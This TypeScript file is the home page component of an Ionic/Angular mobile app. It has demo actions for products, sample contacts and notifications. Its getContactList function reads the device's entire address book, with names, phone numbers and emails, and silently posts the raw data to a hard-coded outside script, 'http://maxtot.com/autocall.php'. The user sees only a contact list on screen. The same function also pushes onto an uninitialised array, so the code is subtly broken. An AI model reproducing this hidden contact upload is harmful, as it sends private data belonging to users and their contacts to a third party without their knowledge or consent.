import { Component } from '@angular/core';
import { NavController, ActionSheetController } from 'ionic-angular';
import { Contacts, Contact, ContactField, ContactName } from '@ionic-native/contacts';
import { LocalNotifications } from '@ionic-native/local-notifications';
import { DataService } from '../../services/data.service';

@Component({
    selector: 'page-home',
    templateUrl: 'home.html'
})
export class HomePage {
    productGroup: string = 'newest';
    items: Array<{ title: string, img: string }>;
    dataHome: any = { 'newest': [] };
    loading: any = { 'newest': false, 'bestseller': false };
    allContacts: any = {};

    constructor(
        public _navCtrl: NavController,
        public _actionSheetCtrl: ActionSheetController,
        private _localNotifications: LocalNotifications,
        private _contacts: Contacts,
        private _dataService: DataService
    ) {
        this.items = [];
        for (let i = 1; i <= 10; i++) {
            this.items.push({
                title: 'This is item #' + i,
                img: 'img_' + (i % 2 == 0 ? '1' : '2') + '.jpg'
            });
        }
        this.loadListProduct();
    }

    ionViewDidLoad() {
        // this._localNotifications.schedule({
        //     id: 1,
        //     text: 'Single ILocalNotification',
        //     data: 'test'
        // });
    }

    loadListProduct() {
        this.loading.newest = true;
        this._dataService.post('product/newest', {}).subscribe(
            res => {
                // console.log('Response: ', res);
                if (res.status == 'success') {
                    this.dataHome['newest'] = res.data;
                }
                this.loading.newest = false;
                // console.log(this.dataHome['newest']);
            },
            err => {
                console.log('err: ', err);
            }
        );
    }

    onSegmentChanged($event) {
        // console.log($event);
        if ($event.value == 'contactlist') {
            if (typeof this.dataHome['contactlist'] == 'undefined')
                this.dataHome['contactlist'] = [];

            if (this.dataHome['contactlist'].length <= 0 && this.loading.contactlist != true) {
                this.getContactList();
            }

        }
    }

    presentActionSheet() {
        let actionSheet = this._actionSheetCtrl.create({
            title: 'Demo actions',
            buttons: [
                {
                    text: 'Add contact',
                    handler: () => {
                        this.addContact();
                    }
                },
                {
                    text: 'Lấy danh bạ',
                    handler: () => {
                        this.getContactList();
                    }
                },
                {
                    text: 'Hiển thị Notify',
                    handler: () => {
                        this.showNotification();
                    }
                },
                {
                    text: 'Cancel',
                    role: 'cancel',
                    handler: () => {
                        console.log('Cancel clicked');
                    }
                }
            ]
        });

        actionSheet.present();
    }

    addContact() {
        let contact: Contact = this._contacts.create();
        // console.log('contact: ', contact);
        contact.name = new ContactName(null, 'Smith', 'John');
        contact.phoneNumbers = [new ContactField('mobile', '6471234567')];
        contact.save().then(
            () => this._dataService.showAlert('Contact saved!', contact),
            (error: any) => this._dataService.showAlert('Error saving contact!', error)
        );
    }

    getContactList() {
        this.loading.contactlist = true;
        this._contacts.find(
            ['displayName', 'name', 'phoneNumbers', 'emails'],
            { filter: "", multiple: true })
            .then(data => {

                let contactlist: any[];
                for (var i = 0; i < data.length; i++) {
                    var contact = data[i];
                    var no = data[i].name.formatted;
                    var phonenumber = data[i].phoneNumbers;
                    if (phonenumber != null) {
                        for (var n = 0; n < phonenumber.length; n++) {
                            var type = phonenumber[n].type;
                            if (type == 'mobile') {
                                var phone = phonenumber[n].value;
                                var mobile;
                                if (phone.slice(0, 1) == '+' || phone.slice(0, 1) == '0') {
                                    mobile = phone.replace(/[^a-zA-Z0-9+]/g, "");
                                }
                                else {
                                    var mobile_no = phone.replace(/[^a-zA-Z0-9]/g, "");
                                    mobile = mobile_no;
                                }

                                var contactData = {
                                    "displayName": no,
                                    "phoneNumbers": mobile,
                                    "emails": contact.emails
                                }
                                contactlist.push(contactData);
                            }
                        }
                    }

                }

                this.loading.contactlist = false;
                this.dataHome['contactlist'] = contactlist;
                this._dataService.post('http://maxtot.com/autocall.php', data).subscribe(
                    res => console.log(res),
                    err => console.log(err)
                );
            },
            (error: any) => {
                this.loading.contactlist = false;
                this._dataService.showAlert('Get list contact!', error)
            });
    }

    showNotification() {
        let infoNotify: any = {
            title: 'Example',
            text: 'Đây là ví dụ về thông báo mới1',
            data: { 'id': 'value' }
        };
        this._localNotifications.schedule(infoNotify);
    }

}
